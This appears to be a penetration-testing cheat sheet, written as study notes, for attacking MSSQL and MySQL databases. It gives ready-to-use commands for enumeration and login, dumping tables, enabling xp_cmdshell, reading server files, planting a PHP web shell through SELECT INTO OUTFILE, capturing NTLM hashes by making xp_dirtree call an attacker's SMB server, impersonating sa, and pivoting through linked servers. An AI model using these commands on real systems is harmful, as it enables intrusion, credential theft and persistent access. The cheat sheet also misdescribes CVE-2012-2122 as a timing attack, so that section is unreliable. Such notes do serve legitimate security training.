# SQL Database Attacks (MSSQL & MySQL)

Databases are high-value targets because they store **sensitive data** (PII, credentials, payment info) and often run with **high privileges** that can be leveraged for lateral movement or privilege escalation.

## 1. Initial Enumeration

Identify the database service, version, and potential misconfigurations by scanning default ports.

|Service|Default Port(s)|Notes|
|:--|:--|:--|
|**MSSQL**|`TCP/1433`, `UDP/1434`|Uses `TCP/2433` if in "hidden" mode.|
|**MySQL**|`TCP/3306`|Standard port for MySQL/MariaDB.|

### Nmap Service Enumeration

Use Nmap to grab banners and run default scripts to identify the specific version and hostname.

```
nmap -Pn -sV -sC -p<PORT> <TARGET_IP>
```

## 2. Authentication & Connection

Accessing the database depends on the authentication mode implemented and the tools available on your attack platform.

### Authentication Modes

|Database|Mode|Description|
|:--|:--|:--|
|**MSSQL**|**Windows Authentication**|Integrated with Windows/AD. Trusted accounts log in without additional credentials.|
|**MSSQL**|**Mixed Mode**|Supports both Windows accounts and SQL-specific username/password pairs.|
|**MySQL**|**Plugin-based**|Supports password-based or Windows authentication via plugins.|

### Connection Commands

Use these commands once credentials or access methods are identified.

#### MySQL Connection

```
mysql -u <USERNAME> -p<PASSWORD> -h <TARGET_IP>
```

#### MSSQL Connection (Linux)

Use **sqsh** for a command-line interface or **mssqlclient.py** from the Impacket suite.

```
# Standard SQL Authentication
sqsh -S <TARGET_IP> -U <USERNAME> -P '<PASSWORD>' -h

# Windows Authentication (using domain or hostname)
sqsh -S <TARGET_IP> -U <DOMAIN>\<USERNAME> -P '<PASSWORD>' -h

# Impacket client
mssqlclient.py -p <PORT> <USERNAME>@<TARGET_IP>
```

#### MSSQL Connection (Windows)

```
sqlcmd -S <TARGET_IP> -U <USERNAME> -P '<PASSWORD>' -y 30 -Y 30
```

_Note: `-y` and `-Y` parameters improve output formatting but may impact performance._

### Authentication Bypass (MySQL 5.6.x)

In specific older versions (CVE-2012-2122), a **timing attack** allows authentication bypass by repeatedly attempting login with an incorrect password, as the server takes longer to respond to incorrect attempts than to a valid one.

## 3. Database Navigation & Information Gathering

Once connected, enumerate the structure to find sensitive tables like users, passwords, or configurations.

|Action|MySQL Syntax|MSSQL Syntax|
|:--|:--|:--|
|**List Databases**|`SHOW DATABASES;`|`SELECT name FROM master.dbo.sysdatabases; GO`|
|**Select Database**|`USE <DATABASE_NAME>;`|`USE <DATABASE_NAME>; GO`|
|**List Tables**|`SHOW TABLES;`|`SELECT table_name FROM <DATABASE_NAME>.INFORMATION_SCHEMA.TABLES; GO`|
|**Dump Table Data**|`SELECT * FROM <TABLE_NAME>;`|`SELECT * FROM <TABLE_NAME>; GO`|

_Note: MSSQL commands via `sqlcmd` require the `GO` statement to execute._

## 4. Operational Workflows: OS Interaction

### Command Execution (MSSQL)

If the user has sufficient privileges, `xp_cmdshell` can be used to execute system commands.

1. **Enable advanced options:**
    
    ```
    EXECUTE sp_configure 'show advanced options', 1;
    RECONFIGURE;
    GO
    ```
    
2. **Enable xp_cmdshell:**
    
    ```
    EXECUTE sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
    GO
    ```
    
3. **Execute command:**
    
    ```
    xp_cmdshell '<COMMAND>';
    GO
    ```
    

### File Operations

Used to read sensitive configuration files or write web shells for persistent OS access.

#### Reading Files

- **MSSQL:** Uses `OPENROWSET` to read any file the service account has access to.
    
    ```
    SELECT * FROM OPENROWSET(BULK N'<FILE_PATH>', SINGLE_CLOB) AS Contents;
    GO
    ```
    
- **MySQL:** Uses `LOAD_FILE()` if `secure_file_priv` is not restrictive.
    
    ```
    SELECT LOAD_FILE('<FILE_PATH>');
    ```
    

#### Writing Files

- **MySQL:** Use `SELECT INTO OUTFILE` to write a web shell to a web-accessible directory.
    
    ```
    SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
    ```
    
    _Requirement: The `secure_file_priv` variable must be empty and the user must have `FILE` privileges._
- **MSSQL:** Requires **Ole Automation Procedures** to be enabled.
    
    ```
    EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
    EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, '<FILE_PATH>', 8, 1;
    EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<CONTENT>';
    ```
    

## 5. Privilege Escalation & Lateral Movement

### NTLM Hash Stealing (MSSQL)

Force the MSSQL service account to authenticate to your controlled SMB server to capture its **NTLMv2 hash**.

1. **Start capture tool on attack machine:**
    
    ```
    sudo responder -I <INTERFACE>
    # OR
    sudo impacket-smbserver share ./ -smb2support
    ```
    
2. **Trigger SMB connection from MSSQL:**
    
    ```
    EXEC master..xp_dirtree '\\<ATTACK_IP>\share';
    GO
    ```
    

### User Impersonation (MSSQL)

Check for the `IMPERSONATE` permission to take on the identity of a more privileged user like `sa`.

1. **Identify impersonation targets:**
    
    ```
    SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
    GO
    ```
    
2. **Impersonate user:**
    
    ```
    EXECUTE AS LOGIN = '<USERNAME>';
    GO
    ```
    
3. **Verify new privileges:**
    
    ```
    SELECT IS_SRVROLEMEMBER('sysadmin');
    GO
    ```
    

### Linked Servers (MSSQL)

Linked servers allow executing commands on **remote database instances**. If the link is configured with `sysadmin` credentials, it facilitates lateral movement.

1. **Identify linked servers:**
    
    ```
    SELECT srvname, isremote FROM sysservers;
    GO
    ```
    
2. **Execute commands on remote server:**
    
    ```
    EXECUTE('<QUERY>') AT [<REMOTE_SERVER_NAME>];
    GO
    ```
    

## Dangerous Misconfigurations

|Setting/Feature|Risk|
|:--|:--|
|**Anonymous Access**|Allows access to the service without any credentials.|
|**xp_cmdshell Enabled**|Allows direct OS command execution from SQL queries.|
|**Empty `secure_file_priv`**|(MySQL) Allows arbitrary file read/write across the filesystem.|
|**IMPERSONATE Permission**|Allows non-admin users to escalate to `sa` privileges.|
|**Linked Server `sysadmin` Link**|Allows lateral movement to other servers with full administrative control.|